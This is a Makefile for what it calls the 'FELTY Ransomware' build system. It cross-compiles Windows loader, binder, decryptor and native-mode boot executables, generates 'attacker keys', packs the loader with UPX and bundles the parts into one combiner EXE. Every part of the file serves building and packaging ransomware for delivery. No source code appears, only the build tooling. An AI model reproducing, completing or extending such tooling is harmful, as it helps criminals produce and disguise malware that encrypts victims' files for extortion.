# ============================================================
#  FELTY Ransomware Build System (Linux cross‑compile to Win)
# ============================================================

CC64 = x86_64-w64-mingw32-gcc
CC32 = i686-w64-mingw32-gcc
STRIP = strip
UPX   = upx
XXD   = xxd
PY    = python3

# Common flags
CFLAGS_BASE = -Os -s -Wall
LFLAGS64 = -lcrypt32 -ladvapi32 -lgdi32 -luser32 -lnetapi32
LFLAGS32 = $(LFLAGS64)
WINFLAGS = -mwindows

# Source files
SRC_LOADER  = felty_loader.c
SRC_BINDER  = felty_binder.c
SRC_DECRYPT = felty_decrypt.c
SRC_BOOT    = felty_boot.c
SRC_COMBINER= combiner.c

# Generated files
KEYGEN_OUT      = attacker_pubkey.h
LOADER_EXE_H    = felty_loader_exe.h
BINDER_EXE_H    = felty_binder_exe.h
DECRYPT_EXE_H   = felty_decrypt_exe.h
COMBINER_X64    = x64/combiner.exe

# Output directories
X64DIR = x64
WIN32DIR = win32

# ================== Targets ==================
.PHONY: all clean combine

all: dirs keygen x64 win32

# Create output dirs
dirs:
	mkdir -p $(X64DIR) $(WIN32DIR)

# Generate attacker keys (only if needed)
keygen: attacker_pubkey.h

attacker_pubkey.h: felty_keygen.py
	@echo "[*] Generating attacker keys..."
	$(PY) felty_keygen.py

# ================== 64-bit Build ==================
x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(X64DIR)/felty_boot.exe combine_x64

$(X64DIR)/felty_loader.exe: $(SRC_LOADER) $(KEYGEN_OUT) | $(X64DIR)
	$(CC64) $(CFLAGS_BASE) -o $@ $< $(LFLAGS64) $(WINFLAGS)
	$(STRIP) --strip-all $@
	-$(UPX) --best $@ 2>/dev/null || true

$(X64DIR)/felty_binder.exe: $(SRC_BINDER) $(KEYGEN_OUT) | $(X64DIR)
	$(CC64) $(CFLAGS_BASE) -o $@ $< $(LFLAGS64) $(WINFLAGS)
	$(STRIP) --strip-all $@

$(X64DIR)/felty_decrypt.exe: $(SRC_DECRYPT) $(KEYGEN_OUT) | $(X64DIR)
	$(CC64) $(CFLAGS_BASE) -municode -o $@ $< -lcrypt32 -ladvapi32
	$(STRIP) --strip-all $@

$(X64DIR)/felty_boot.exe: $(SRC_BOOT) | $(X64DIR)
	$(CC64) $(CFLAGS_BASE) -nostdlib -Wl,--subsystem,native -e NtProcessStartup -o $@ $< -lntdll
	$(STRIP) --strip-all $@

# ================== 32-bit Build ==================
win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe $(WIN32DIR)/felty_boot.exe combine_win32

$(WIN32DIR)/felty_loader.exe: $(SRC_LOADER) $(KEYGEN_OUT) | $(WIN32DIR)
	$(CC32) $(CFLAGS_BASE) -o $@ $< $(LFLAGS32) $(WINFLAGS)
	$(STRIP) --strip-all $@
	-$(UPX) --best $@ 2>/dev/null || true

$(WIN32DIR)/felty_binder.exe: $(SRC_BINDER) $(KEYGEN_OUT) | $(WIN32DIR)
	$(CC32) $(CFLAGS_BASE) -o $@ $< $(LFLAGS32) $(WINFLAGS)
	$(STRIP) --strip-all $@

$(WIN32DIR)/felty_decrypt.exe: $(SRC_DECRYPT) $(KEYGEN_OUT) | $(WIN32DIR)
	$(CC32) $(CFLAGS_BASE) -municode -o $@ $< -lcrypt32 -ladvapi32
	$(STRIP) --strip-all $@

$(WIN32DIR)/felty_boot.exe: $(SRC_BOOT) | $(WIN32DIR)
	$(CC32) $(CFLAGS_BASE) -nostdlib -Wl,--subsystem,native -e _NtProcessStartup@4 -o $@ $< -lntdll
	$(STRIP) --strip-all $@

# ================== Combiner (single EXE) ==================
combine: combine_x64 combine_win32

combine_x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe combiner.c
	@echo "[*] Building 64-bit combiner..."
	$(XXD) -i $(X64DIR)/felty_loader.exe > $(LOADER_EXE_H)
	$(XXD) -i $(X64DIR)/felty_binder.exe > $(BINDER_EXE_H)
	$(XXD) -i $(X64DIR)/felty_decrypt.exe > $(DECRYPT_EXE_H)
	$(CC64) $(CFLAGS_BASE) -o $(COMBINER_X64) combiner.c $(WINFLAGS) \
	    -I. -include $(LOADER_EXE_H) -include $(BINDER_EXE_H) -include $(DECRYPT_EXE_H)
	$(STRIP) --strip-all $(COMBINER_X64)
	@echo "[+] Built: $(COMBINER_X64)"

combine_win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe combiner.c
	@echo "[*] Building 32-bit combiner..."
	$(XXD) -i $(WIN32DIR)/felty_loader.exe > $(LOADER_EXE_H)
	$(XXD) -i $(WIN32DIR)/felty_binder.exe > $(BINDER_EXE_H)
	$(XXD) -i $(WIN32DIR)/felty_decrypt.exe > $(DECRYPT_EXE_H)
	$(CC32) $(CFLAGS_BASE) -o $(WIN32DIR)/combiner.exe combiner.c $(WINFLAGS) \
	    -I. -include $(LOADER_EXE_H) -include $(BINDER_EXE_H) -include $(DECRYPT_EXE_H)
	$(STRIP) --strip-all $(WIN32DIR)/combiner.exe
	@echo "[+] Built: $(WIN32DIR)/combiner.exe"

# ================== Clean ==================
clean:
	rm -rf $(X64DIR) $(WIN32DIR) *.exe $(KEYGEN_OUT) $(LOADER_EXE_H) $(BINDER_EXE_H) $(DECRYPT_EXE_H) *.o
	@echo "[*] Cleaned."

# ================== Help ==================
help:
	@echo "Usage:"
	@echo "  make          - Build x64 & win32 binaries"
	@echo "  make combine  - Build single combiner EXE"
	@echo "  make clean    - Remove all built files"
	@echo "  make keygen   - Generate attacker keys only"
